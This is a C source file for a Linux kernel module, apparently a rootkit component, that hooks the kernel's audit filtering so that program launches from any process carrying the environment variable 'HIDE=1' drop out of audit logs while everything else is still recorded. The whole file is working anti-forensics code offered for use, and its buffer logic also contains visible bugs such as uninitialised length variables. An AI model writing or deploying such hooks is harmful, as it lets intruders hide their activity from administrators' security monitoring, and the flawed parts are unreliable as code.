/*
	A loadable kernel module that hides Audit-framework syscall logging once our command has our magic 
    environment variable while still logging others.
	
	This implementition assumes auditing EXECVE syscalls.
	e.g.: 
		auditctl -a exit,always -F arch=b32 -S execve
		auditctl -a exit,always -F arch=b64 -S execve
*/

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/audit.h>
#include "khook/engine.c"
#include "proj.h"

#define MAX_EXECVE_AUDIT_LEN 7500
#define MAX_ARG_STRLEN (PAGE_SIZE * 32)
#define MAGIC_ARG "HIDE=1"


KHOOK_EXT(int, audit_filter_rules, struct task_struct *tsk,
			      struct audit_krule *rule,
			      struct audit_context *ctx,
			      struct audit_names *name,
			      enum audit_state *state,
			      bool task_creation);


bool is_our_magic(struct audit_context *ctx){

	// looks for our magic in environ's process
	
	long len_max;
	long len_full;
	long len_buf;
	long arg_len;
	char *buf_head;
	char *buf;
	bool is_our_magic = false;

	const char __user *env_arg = (const char __user *)current->mm->env_start;

	len_max = MAX_EXECVE_AUDIT_LEN;

	buf_head = kmalloc(MAX_EXECVE_AUDIT_LEN + 1, GFP_KERNEL);

	if (!buf_head) {
		printk("error, could not kmalloc.\n");
		return false;
	}

	do{
		buf = buf_head;
		if (len_full == 0)
				len_full = strnlen_user(env_arg, MAX_ARG_STRLEN) - 1;

		arg_len = strncpy_from_user(&buf_head[len_buf], env_arg, len_max);

		if(-EFAULT == arg_len){
			printk("error, unable to read %ld bytes\n", arg_len);
			break;
		}
		
		if(0 == strcmp(&buf_head[len_buf], MAGIC_ARG)){
			// found our magic env variable.
			is_our_magic = true;
			break;
		}
		env_arg += (int)(arg_len + 1);
		arg_len = 0;
		len_buf += arg_len;
	} while (buf_head[len_buf] != '\0');
	
	kfree(buf_head);
	return is_our_magic;

}


static int khook_audit_filter_rules(struct task_struct *tsk,
			      struct audit_krule *rule,
			      struct audit_context *ctx,
			      struct audit_names *name,
			      enum audit_state *state,
			      bool task_creation)
{
	int ret = 0;
	printk("hooked audit_filter_rules()!!");

	ret = KHOOK_ORIGIN(audit_filter_rules, tsk, rule, ctx, name, state, task_creation);

	if (ctx->major == 59) //symbol of EXECVE
	{
		if(is_our_magic(ctx)){
			printk("our magic is found, hiding.\n");
			*state = AUDIT_DISABLED;
		}
		return 0;
	}
	return ret;
}


int init_module(void)
{
	return khook_init();
}


void cleanup_module(void)
{
	khook_cleanup();
}

MODULE_LICENSE("GPL");